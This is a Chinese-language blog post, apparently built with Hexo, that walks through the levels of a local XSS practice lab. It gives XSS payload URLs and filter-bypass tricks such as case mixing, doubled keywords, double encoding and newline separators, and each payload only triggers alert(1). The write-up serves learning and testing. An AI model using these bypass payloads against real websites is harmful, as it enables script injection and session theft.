@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/pig_128x128.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/pig_32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/pig_16x16.ico">
+  <link rel="mask-icon" href="/images/pig_128x128.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rotoro Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"slient2009.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="很久之前的XSS-Lab实验记录，权当凑数。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS-Lab 过关">
+<meta property="og:url" content="http://slient2009.github.io/2021/11/22/XSS-Lab/index.html">
+<meta property="og:site_name" content="Slient2009">
+<meta property="og:description" content="很久之前的XSS-Lab实验记录，权当凑数。">
+<meta property="og:locale" content="ja_JP">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111226621.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111106471.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715144909149.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128120223330.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715151535637.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111939700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715152933866.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160658462.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160638311.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113421841.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113531000.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128112539027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114131808.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114214613.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114408003.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204721930.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204737776.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204810094.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210259484.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210328418.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210549269.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716114658159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115239376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115638195.png">
+<meta property="article:published_time" content="2021-11-22T05:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-10T16:58:54.000Z">
+<meta property="article:author" content="slient2009">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111226621.png">
+
+<link rel="canonical" href="http://slient2009.github.io/2021/11/22/XSS-Lab/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'ja'
+  };
+</script>
+
+  <title>XSS-Lab 过关 | Slient2009</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Slient2009" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="ナビゲーションバーの切り替え">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Slient2009</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">All I need is Twin Island Milk</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>ホーム</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>プロフィール</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>タグ<span class="badge">8</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>アーカイブ<span class="badge">26</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="ja">
+    <link itemprop="mainEntityOfPage" href="http://slient2009.github.io/2021/11/22/XSS-Lab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/round_tiger.png">
+      <meta itemprop="name" content="slient2009">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Slient2009">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XSS-Lab 过关
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">投稿日</span>
+
+              <time title="作成日：2021-11-22 00:00:00" itemprop="dateCreated datePublished" datetime="2021-11-22T00:00:00-05:00">2021-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">編集日</span>
+                <time title="修正日：2021-12-10 11:58:54" itemprop="dateModified" datetime="2021-12-10T11:58:54-05:00">2021-12-10</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="閲覧数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">閲覧数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>很久之前的XSS-Lab实验记录，权当凑数。</p>
+<span id="more"></span>
+
+<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>首先审查元素，明确输入的payload在页面中的位置。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111226621.png" alt="image-20201128111226621"></p>
+<p>显然，这里需要闭合<code>&lt;h2&gt;</code>标签，然后跟上js代码。</p>
+<p>因为是第一关，没有特别的过滤，直接闭合就好了。</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level1.php?name=testalert(%27xxs%27);">http://192.168.68.219/xss/level1.php?name=test</h2><script>alert('xxs');</script></a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111106471.png" alt="image-20201128111106471"></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>html实体编码</p>
+<p>这里要往表单input标签里面注入<br><a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level2.php?keyword=aa%22%3Ealert(1);">http://192.168.68.219/xss/level2.php?keyword=aa%22%3E%3Cscript%3Ealert(1);%3C/script%3E</a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715144909149.png" alt="image-20200715144909149"></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><code>&lt;&gt;</code>被实体编码拦截，但是加<code>&#39;</code>或者<code>&quot;</code>会使得浏览器自动补全。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128120223330.png" alt="image-20201128120223330"></p>
+<p>这里关注input标签，使用onfocus=alert(1) autofocus移动光标到元素上(或者点击)就可以触发弹窗。<br>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus%5D">http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level3.php?keyword=11&#39;">http://192.168.68.219/xss/level3.php?keyword=11&#39;</a> onfocus=alert(1) autofocus)</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715151535637.png" alt="image-20200715151535637"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111939700.png" alt="image-20201128111939700"></p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这里会在<code>=</code>后面添加<code>&quot;</code>于是onfocus=alert(1)不大行了（其实还是可以触发弹窗，不过不能触发window.alert()<br>既然会自动添加<code>&quot;</code>，那么刚好用”javascript:xxxx”的方式来绕过。（好吧这个也不能触发跳转<br>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert%281%29]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level4.php?keyword=123&#39;&quot;">http://192.168.68.219/xss/level4.php?keyword=123&#39;&quot;</a> onfocus=”javascript:alert(1))</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715152933866.png" alt="image-20200715152933866"></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>过滤了script-&gt;s_cript    onload-&gt;o_nload<br>不知道为什么javascript:alert(1)没反应，明明解析出来都没问题。</p>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111&quot;">http://192.168.68.219/xss/level5.php?keyword=11111&quot;</a> &gt;</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160658462.png" alt="image-20200715160658462"></p>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert%281%29]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111&quot;">http://192.168.68.219/xss/level5.php?keyword=11111&quot;</a> &gt;</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160638311.png" alt="image-20200715160638311"></p>
+<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>href-&gt;hr_ef<br>src-&gt;sr_c</p>
+<p>懂了，原来考的是大小写绕过，那么前面几个题也可以按照这种方法来过。</p>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E%5D">http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level6.php?keyword=111&quot;">http://192.168.68.219/xss/level6.php?keyword=111&quot;</a> &gt;alert(1))</p>
+<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>存在关键词过滤，这里可以使用双写关键字绕过过滤，并不能使用大小写绕过。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113421841.png" alt="image-20201128113421841"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113531000.png" alt="image-20201128113531000"></p>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E%5D">http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level7.php?keyword=&quot;">http://192.168.68.219/xss/level7.php?keyword=&quot;</a> &gt;alert(1))</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128112539027.png" alt="image-20201128112539027"></p>
+<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>非常神奇地在这儿卡了半天，因为一些编码的问题。</p>
+<p>审计PHP的源代码，发现过滤了script等关键字，当然可以通过实体编码绕过，比如hex或者unicode，但是要命的是hex有可能在浏览器中被自动解码再发送，而unicode是以&amp;#开头。在url中，&amp;用来分割参数，#之后的部分不向后端发送，只在本地被使用(比如锚点定位)。</p>
+<p>如 <code>keyword=javascrip&amp;#116;:alert(1)</code>,在后端，keyword只接受到<code>javascrip</code>，非常难过。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114131808.png" alt="image-20201128114131808"></p>
+<p>又如<code>keyword=%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29</code>，只使用一次urlhex编码，然后被浏览器自动解码。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114214613.png" alt="image-20201128114214613"></p>
+<p><strong>solution</strong></p>
+<p>解决办法是使用两次编码，先unicode 后 urlhex。</p>
+<p><code>javascript:alert(1)</code></p>
+<p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
+<p><code>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B</code></p>
+<p>payload:<code>keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128114408003.png" alt="image-20201128114408003"></p>
+<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>在level8的基础之上，会检查网址格式是否包含http://，所以直接alert(‘http://‘)就好，其余和level8一样，只需要编码javascript就好。</p>
+<p>level9.php?<code>keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B:alert(%27http://%27)</code></p>
+<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>检查到有三个隐藏的参数，那么首先就是要取消隐藏属性，然后构造xss触发弹窗就好，貌似没有之前的考点。</p>
+<p><code>level10.php?keyword=well%20done!&amp;t_sort=a&quot;%20onfocus=javascript:alert(1)%20autofocus%20type=&quot;on</code></p>
+<p><code>level10.php?keyword=well%20done!&amp;t_sort=a&quot;%20onmouseover=javascript:alert(1)%20autofocus%20type=&quot;on</code></p>
+<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>这一关比较有意思，虽然t_sort可以被操纵，但是被编码了，没有利用的办法。注入点在refer里，所以只是把level10的payload写在refer里面就好。<br>Firefox好像可以拦截请求修改之后再放出去，但是没有取了解，这里用的是burp。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204721930.png" alt="image-20200715204721930"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204737776.png" alt="image-20200715204737776"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715204810094.png" alt="image-20200715204810094"></p>
+<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>类似的，只是注入的是useragent</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210259484.png" alt="image-20200715210259484"></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210328418.png" alt="image-20200715210328418"></p>
+<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>仍然是类似的，注入的是cookie</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210549269.png" alt="image-20200715210549269"></p>
+<h3 id="level14–"><a href="#level14–" class="headerlink" title="level14–"></a>level14–</h3><p>不会，看了WP也不会的那种。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</a></p>
+<h3 id="level15–"><a href="#level15–" class="headerlink" title="level15–"></a>level15–</h3><p>angular倒是很有意思，但是不会。</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/angularjs/angularjs-intro.html">https://www.runoob.com/angularjs/angularjs-intro.html</a></p>
+<p>加载angular.js要科学上网，上网回来请求多了这一坨回来不知道怎么回事儿。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716114658159.png" alt="image-20200716114658159"></p>
+<p>然后console里面就这样了，看上去level1.php是请求了，但是没有被加载到页面里。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png" alt="image-20200716115010742"></p>
+<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>一开始仿照以前的两次编码，写了这个payload，但是关键字不能被解析，反而一直被当成文本，想来可能是两次编码的问题。</p>
+<p><code>level16.php?keyword=111%26%2360%3B%26%2347%3B%26%2399%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%23101%3B%26%23114%3B%26%2362%3B%26%2360%3B%26%23105%3B%26%23109%3B%26%23103%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2349%3B%26%2332%3B%26%23111%3B%26%23110%3B%26%23101%3B%26%23114%3B%26%23114%3B%26%23111%3B%26%23114%3B%26%2361%3B%26%2334%3B%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2399%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%23101%3B%26%23114%3B%26%2362%3B</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716091758748.png" alt="image-20200716091758748"></p>
+<p>后面还是上网了，看到可以用<code>%0d</code>(tab)和<code>%0a</code>(换行)来截断。</p>
+<p><code>level16.php?keyword=1111%3Cimg%0asrc=1%0aonerror=%22javascript:alert(1)%22%3E%3Ccenter%3E</code></p>
+<h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>审查元素，可以发现GET参数实则是Flash脚本的参数。</p>
+<p>通过查询flash xss相关文章，可以了解到jsFunction是个关键，构造payload使得jsFunction这个关键字被解析，从而跳出了src属性，然后使用常用的onmouseover属性方法加载xss payload。</p>
+<p>jsFunction被解析为属性名。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115239376.png" alt="image-20201128115239376"></p>
+<p>然后使用onmouseover或者其他方法执行alert()语句，如果过滤空格，根据level16,可以用%0a绕过。</p>
+<p><code>?arg01=1111&quot;&amp;arg02=eeeeee%20jsFunction%0aonmouseover=javascript:alert(1)</code></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128115638195.png" alt="image-20201128115638195"></p>
+<h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>同样的套路。</p>
+<p><code>?arg01=a&amp;arg02=b%20jsFunction%20onmouseover=javascript:alert(1)</code></p>
+<h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/6253464226/">https://www.freesion.com/article/6253464226/</a></p>
+<p>抄袭payload<code>arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(/xss/)%22%20onerror=%22javascript:alert(1)%22%3Exss%3C/a%3E</code></p>
+<h3 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h3><p>竟然还需要逆向swf，那就只好抄了。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/103217680">https://blog.csdn.net/u014029795/article/details/103217680</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/22/Web-Labs/" rel="prev" title="SQL,XSS,文件上传实验记录">
+      <i class="fa fa-chevron-left"></i> SQL,XSS,文件上传实验记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/22/Upload-Lab/" rel="next" title="Upload-Lab 过关">
+      Upload-Lab 过关 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          見出し
+        </li>
+        <li class="sidebar-nav-overview">
+          概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-number">2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5"><span class="nav-number">5.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level6"><span class="nav-number">6.</span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level7"><span class="nav-number">7.</span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level8"><span class="nav-number">8.</span> <span class="nav-text">level8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level9"><span class="nav-number">9.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level10"><span class="nav-number">10.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level11"><span class="nav-number">11.</span> <span class="nav-text">level11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level12"><span class="nav-number">12.</span> <span class="nav-text">level12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level13"><span class="nav-number">13.</span> <span class="nav-text">level13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level14%E2%80%93"><span class="nav-number">14.</span> <span class="nav-text">level14–</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level15%E2%80%93"><span class="nav-number">15.</span> <span class="nav-text">level15–</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level16"><span class="nav-number">16.</span> <span class="nav-text">level16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level17"><span class="nav-number">17.</span> <span class="nav-text">level17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level18"><span class="nav-number">18.</span> <span class="nav-text">level18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level19"><span class="nav-number">19.</span> <span class="nav-text">level19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level20"><span class="nav-number">20.</span> <span class="nav-text">level20</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="slient2009"
+      src="/images/round_tiger.png">
+  <p class="site-author-name" itemprop="name">slient2009</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
